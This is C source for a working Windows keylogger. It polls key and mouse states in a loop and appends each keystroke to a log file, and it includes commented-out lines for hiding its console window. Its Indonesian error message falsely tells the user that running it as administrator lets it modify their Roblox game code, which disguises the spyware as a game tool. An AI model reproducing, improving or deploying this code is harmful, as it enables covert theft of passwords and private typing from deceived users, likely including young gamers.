#define _WIN32_WINNT 0x0500

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdbool.h>

#include "keylogger.h"

bool isKeyDown(int index, unsigned long long * keyDownStates) {
    if (index < 0 || index >= 64) return false;
    return (*keyDownStates & (1ULL << index)) != 0;
}

void setKeyDown(int index, unsigned long long * keyDownStates) {
    if (index >= 0 && index < 64) *keyDownStates |= (1ULL << index);
}

void clearKeyDown(int index, unsigned long long * keyDownStates) {
    if (index >= 0 && index < 64) *keyDownStates &= ~(1ULL << index);
}

DWORD WINAPI activateKeylog(LPVOID param)
{
	unsigned long long keyDownStates = 0ULL;

	HWND hwnd=GetConsoleWindow();
	//ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
	//ShowWindow(hwnd,SW_HIDE);

	FILE * fp = fopen(KEYLOG_PATH, "a");

	if (fp == NULL){
		perror("JALANKAN SEBAGAI ADMINISTRATOR\nAGAR PROGRAM DAPAT MENGOTAK-ATIK\nKODE GAME ROBLOX YANG ADA PADA\nKOMPUTER ANDA");
		getchar();
		exit(1);
	}
	unsigned char count = 1;

	char buffer[5] = {0};

	fputs("\n", fp); fflush(fp);

	while (1) {
		if(count > 120) {fputs("\n", fp); fflush(fp); count = 0;}

		// Baris 1: [MOUSE1]
		if ((GetAsyncKeyState(1) & 0x8000) && !isKeyDown(1, &keyDownStates)) {
			count += 8;
			fputs("[MOUSE1]", fp);
			fflush(fp);
			setKeyDown(1, &keyDownStates);
		} else if (!(GetAsyncKeyState(1) & 0x8000)) {
			clearKeyDown(1, &keyDownStates);
		}

		// Baris 2: [MOUSE2]
		if ((GetAsyncKeyState(2) & 0x8000) && !isKeyDown(2, &keyDownStates)) {
			count += 8;
			fputs("[MOUSE2]", fp);
			fflush(fp);
			setKeyDown(2, &keyDownStates);
		} else if (!(GetAsyncKeyState(2) & 0x8000)) {
			clearKeyDown(2, &keyDownStates);
		}

		// Baris 3: [BACKSPACE]
		if ((GetAsyncKeyState(8) & 0x8000) && !isKeyDown(3, &keyDownStates)) {
			count += 11;
			fputs("[BACKSPACE]", fp);
			fflush(fp);
			setKeyDown(3, &keyDownStates);
		} else if (!(GetAsyncKeyState(8) & 0x8000)) {
			clearKeyDown(3, &keyDownStates);
		}

		// Baris 4: [TAB]
		if ((GetAsyncKeyState(9) & 0x8000) && !isKeyDown(4, &keyDownStates)) {
			count += 5;
			fputs("[TAB]", fp);
			fflush(fp);
			setKeyDown(4, &keyDownStates);
		} else if (!(GetAsyncKeyState(9) & 0x8000)) {
			clearKeyDown(4, &keyDownStates);
		}

		// Baris 5: [ENTER]
		if ((GetAsyncKeyState(13) & 0x8000) && !isKeyDown(5, &keyDownStates)) {
			count += 7;
			fputs("[ENTER]", fp);
			fflush(fp);
			setKeyDown(5, &keyDownStates);
		} else if (!(GetAsyncKeyState(13) & 0x8000)) {
			clearKeyDown(5, &keyDownStates);
		}

		// Baris 6: [SHIFT]
		if ((GetAsyncKeyState(16) & 0x8000) && !isKeyDown(6, &keyDownStates)) {
			count += 7;
			fputs("[SHIFT]", fp);
			fflush(fp);
			setKeyDown(6, &keyDownStates);
		} else if (!(GetAsyncKeyState(16) & 0x8000)) {
			clearKeyDown(6, &keyDownStates);
		}

		// Baris 7: [CAPS]
		if ((GetAsyncKeyState(20) & 0x8000) && !isKeyDown(7, &keyDownStates)) {
			count += 6;
			fputs("[CAPS]", fp);
			fflush(fp);
			setKeyDown(7, &keyDownStates);
		} else if (!(GetAsyncKeyState(20) & 0x8000)) {
			clearKeyDown(7, &keyDownStates);
		}

		// Baris 8: [ESC] - Digunakan juga untuk keluar dari loop
		if ((GetAsyncKeyState(27) & 0x8000) && !isKeyDown(8, &keyDownStates)) {
			count += 5;
			fputs("[ESC]", fp);
			fflush(fp);
			setKeyDown(8, &keyDownStates);
			// If ESC is pressed, exit the program
			break;
		} else if (!(GetAsyncKeyState(27) & 0x8000)) {
			clearKeyDown(8, &keyDownStates);
		}

		// Baris 9: [SPACE]
		if ((GetAsyncKeyState(32) & 0x8000) && !isKeyDown(9, &keyDownStates)) {
			count += 7;
			fputs("[SPACE]", fp);
			fflush(fp);
			setKeyDown(9, &keyDownStates);
		} else if (!(GetAsyncKeyState(32) & 0x8000)) {
			clearKeyDown(9, &keyDownStates);
		}

		// Baris 10: [DEL]
		if ((GetAsyncKeyState(46) & 0x8000) && !isKeyDown(10, &keyDownStates)) {
			count += 5;
			fputs("[DEL]", fp);
			fflush(fp);
			setKeyDown(10, &keyDownStates);
		} else if (!(GetAsyncKeyState(46) & 0x8000)) {
			clearKeyDown(10, &keyDownStates);
		}

		// Baris 11-20: [0-9] (Virtual Key Codes 48-57)
		for (int i = 0; i <= 9; ++i) {
			int vk_code = 48 + i;
			int index = 11 + i;
			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &keyDownStates)) {
				count++;
				fprintf(fp, "%d", i);
				fflush(fp);
				setKeyDown(index, &keyDownStates);
			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
				clearKeyDown(index, &keyDownStates);
			}
		}

		// Baris 21-46: [A-Z] (Virtual Key Codes 65-90)
		for (int i = 0; i <= 25; ++i) {
			int vk_code = 65 + i;
			int index = 21 + i;
			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &keyDownStates)) {
				count++;
				fprintf(fp, "%c", (char)('A' + i));
				fflush(fp);
				setKeyDown(index, &keyDownStates);
			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
				clearKeyDown(index, &keyDownStates);
			}
		}

		// Baris 47: [MOD] - Assuming VK_LWIN/VK_RWIN (Windows Key)
		if ((GetAsyncKeyState(91) & 0x8000) && !isKeyDown(47, &keyDownStates)) {
			count += 5;
			fputs("[MOD]", fp);
			fflush(fp);
			setKeyDown(47, &keyDownStates);
		} else if (!(GetAsyncKeyState(91) & 0x8000)) {
			clearKeyDown(47, &keyDownStates);
		}

		// Baris 48-49: [CTRL] (VK_LCONTROL 162, VK_RCONTROL 163)
		if ((GetAsyncKeyState(162) & 0x8000) && !isKeyDown(48, &keyDownStates)) {
			count += 11;
			fputs("[CTRL_LEFT]", fp);
			fflush(fp);
			setKeyDown(48, &keyDownStates);
		} else if (!(GetAsyncKeyState(162) & 0x8000)) {
			clearKeyDown(48, &keyDownStates);
		}
		if ((GetAsyncKeyState(163) & 0x8000) && !isKeyDown(49, &keyDownStates)) {
			count += 12;
			fputs("[CTRL_RIGHT]", fp);
			fflush(fp);
			setKeyDown(49, &keyDownStates);
		} else if (!(GetAsyncKeyState(163) & 0x8000)) {
			clearKeyDown(49, &keyDownStates);
		}

		// Baris 50-51: [ALT] (VK_LMENU 164, VK_RMENU 165)
		if ((GetAsyncKeyState(164) & 0x8000) && !isKeyDown(50, &keyDownStates)) {
			count += 10;
			fputs("[ALT_LEFT]", fp);
			fflush(fp);
			setKeyDown(50, &keyDownStates);
		} else if (!(GetAsyncKeyState(164) & 0x8000)) {
			clearKeyDown(50, &keyDownStates);
		}
		if ((GetAsyncKeyState(165) & 0x8000) && !isKeyDown(51, &keyDownStates)) {
			count += 11;
			fputs("[ALT_RIGHT]", fp);
			fflush(fp);
			setKeyDown(51, &keyDownStates);
		} else if (!(GetAsyncKeyState(165) & 0x8000)) {
			clearKeyDown(51, &keyDownStates);
		}

		// Baris 52: [;]
		if ((GetAsyncKeyState(186) & 0x8000) && !isKeyDown(52, &keyDownStates)) {
			count += 3;
			fputs("[;]", fp);
			fflush(fp);
			setKeyDown(52, &keyDownStates);
		} else if (!(GetAsyncKeyState(186) & 0x8000)) {
			clearKeyDown(52, &keyDownStates);
		}

		// Baris 53: [PLUS]
		if ((GetAsyncKeyState(187) & 0x8000) && !isKeyDown(53, &keyDownStates)) {
			count += 6;
			fputs("[PLUS]", fp);
			fflush(fp);
			setKeyDown(53, &keyDownStates);
		} else if (!(GetAsyncKeyState(187) & 0x8000)) {
			clearKeyDown(53, &keyDownStates);
		}

		// Baris 54: [,]
		if ((GetAsyncKeyState(188) & 0x8000) && !isKeyDown(54, &keyDownStates)) {
			count += 3;
			fputs("[,]", fp);
			fflush(fp);
			setKeyDown(54, &keyDownStates);
		} else if (!(GetAsyncKeyState(188) & 0x8000)) {
			clearKeyDown(54, &keyDownStates);
		}

		// Baris 55: [MIN]
		if ((GetAsyncKeyState(189) & 0x8000) && !isKeyDown(55, &keyDownStates)) {
			count += 5;
			fputs("[MIN]", fp);
			fflush(fp);
			setKeyDown(55, &keyDownStates);
		} else if (!(GetAsyncKeyState(189) & 0x8000)) {
			clearKeyDown(55, &keyDownStates);
		}

		// Baris 56: [.]
		if ((GetAsyncKeyState(190) & 0x8000) && !isKeyDown(56, &keyDownStates)) {
			count += 3;
			fputs("[.]", fp);
			fflush(fp);
			setKeyDown(56, &keyDownStates);
		} else if (!(GetAsyncKeyState(190) & 0x8000)) {
			clearKeyDown(56, &keyDownStates);
		}

		// Baris 57: [/]
		if ((GetAsyncKeyState(191) & 0x8000) && !isKeyDown(57, &keyDownStates)) {
			count += 3;
			fputs("[/]", fp);
			fflush(fp);
			setKeyDown(57, &keyDownStates);
		} else if (!(GetAsyncKeyState(191) & 0x8000)) {
			clearKeyDown(57, &keyDownStates);
		}

		// Baris 58: [`]
		if ((GetAsyncKeyState(192) & 0x8000) && !isKeyDown(58, &keyDownStates)) {
			count += 3;
			fputs("[`]", fp);
			fflush(fp);
			setKeyDown(58, &keyDownStates);
		} else if (!(GetAsyncKeyState(192) & 0x8000)) {
			clearKeyDown(58, &keyDownStates);
		}

		// Baris 59: [ [ ]
		if ((GetAsyncKeyState(219) & 0x8000) && !isKeyDown(59, &keyDownStates)) {
			count += 3;
			fputs("[[]", fp);
			fflush(fp);
			setKeyDown(59, &keyDownStates);
		} else if (!(GetAsyncKeyState(219) & 0x8000)) {
			clearKeyDown(59, &keyDownStates);
		}

		// Baris 60: [ \ ]
		if ((GetAsyncKeyState(220) & 0x8000) && !isKeyDown(60, &keyDownStates)) {
			count += 3;
			fputs("[\\]", fp);
			fflush(fp);
			setKeyDown(60, &keyDownStates);
		} else if (!(GetAsyncKeyState(220) & 0x8000)) {
			clearKeyDown(60, &keyDownStates);
		}

		// Baris 61: [ ] ]
		if ((GetAsyncKeyState(221) & 0x8000) && !isKeyDown(61, &keyDownStates)) {
			count += 3;
			fputs("[]]", fp);
			fflush(fp);
			setKeyDown(61, &keyDownStates);
		} else if (!(GetAsyncKeyState(221) & 0x8000)) {
			clearKeyDown(61, &keyDownStates);
		}

		// Baris 62: [']
		if ((GetAsyncKeyState(222) & 0x8000) && !isKeyDown(62, &keyDownStates)) {
			count += 3;
			fputs("[']", fp);
			fflush(fp);
			setKeyDown(62, &keyDownStates);
		} else if (!(GetAsyncKeyState(222) & 0x8000)) {
			clearKeyDown(62, &keyDownStates);
		}

		Sleep(10);
	}
	
	fclose(fp);
 
 return 0;
}
